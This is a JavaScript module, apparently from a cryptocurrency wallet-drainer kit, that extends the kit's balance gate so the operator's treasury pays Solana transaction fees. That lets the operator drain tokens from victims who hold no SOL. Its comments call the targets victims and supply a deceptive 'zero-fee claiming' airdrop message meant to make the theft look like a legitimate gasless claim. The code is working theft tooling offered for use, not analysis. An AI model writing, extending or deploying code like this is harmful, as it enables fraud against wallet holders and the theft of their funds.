'use strict';
/**
 * Fee sponsorship flow — drain zero-balance wallets.
 *
 * Research source: Impala v2.0 spec (impala.cam, Q3 2026):
 *   "Solana Execution Benchmark — wallet hierarchy resolution in <0.5s
 *    with fee sponsorship support for zero-balance targets."
 *
 * The base kit's balance gate REJECTS wallets with < ~0.60 SOL because the
 * victim must pay transaction fees. Fee sponsorship flips this: the
 * operator's treasury pays the fees, so a victim with 0 SOL but valuable
 * tokens can still be drained.
 *
 * HOW IT WORKS:
 *   - feePayer = treasury (operator), not victim
 *   - Victim still signs as token account authority (required by Token program)
 *   - Operator's treasury pays the base fee + priority fee
 *   - Treasury is already a co-signer server-side in the base kit, so the
 *     only change is the feePayer assignment in the transaction header
 *
 * BALANCE GATE CHANGE:
 *   Old gate: lamports < feeMin → REJECT (victim can't pay)
 *   New gate: lamports < feeMin AND tokenValue == 0 → REJECT
 *             lamports < feeMin AND tokenValue > 0 → SPONSORED drain
 *
 * GAS-LESS UI FRAMING:
 *   "Zero-fee claiming — network fees are covered by the airdrop program."
 *   This is actually a CONVERSION IMPROVEMENT: gasless claims are a known
 *   legitimate UX (Jupiter, Dialect do real gasless claims), so the framing
 *   reads as a feature, not a red flag.
 *
 * Sources:
 *   - Impala v2.0 marketing (2026)
 *   - chain/portfolio.js + page/balance_gate.js (base kit gate)
 */

const { computeMinLamports } = require('../page/balance_gate');

/**
 * shouldSponsor(lamports, tokenUsdValue, minLamports):
 *   Decide whether to run a sponsored drain on a low-SOL wallet.
 *   Sponsor when the victim can't pay fees but has drainable value.
 */
function shouldSponsor(lamports, tokenUsdValue, minLamports) {
  if (lamports >= minLamports) return false;       // victim pays normally
  return tokenUsdValue > 0;                        // still worth draining
}

/**
 * sponsoredGate(walletInfo, portfolio, config):
 *   Extended balance gate that classifies the wallet into:
 *     'reject'    — no value at all, skip
 *     'normal'    — victim pays fees, standard flow
 *     'sponsored' — operator pays fees, sponsored flow
 */
function sponsoredGate(walletInfo, portfolio, config) {
  const minLamports = computeMinLamports(config);
  const tokenUsd = (portfolio?.tokens || []).reduce((s, t) => s + (t.usd || 0), 0);

  if (!walletInfo || walletInfo.lamports === 0 && tokenUsd === 0) {
    return { action: 'reject', reason: 'no value' };
  }

  if (shouldSponsor(walletInfo.lamports, tokenUsd, minLamports)) {
    return {
      action: 'sponsored',
      feePayer: config?.treasury, // operator pays
      framing:  'Zero-fee claiming — network fees are covered by the airdrop program.',
    };
  }

  return { action: 'normal', feePayer: walletInfo.pubkey };
}

module.exports = { shouldSponsor, sponsoredGate };
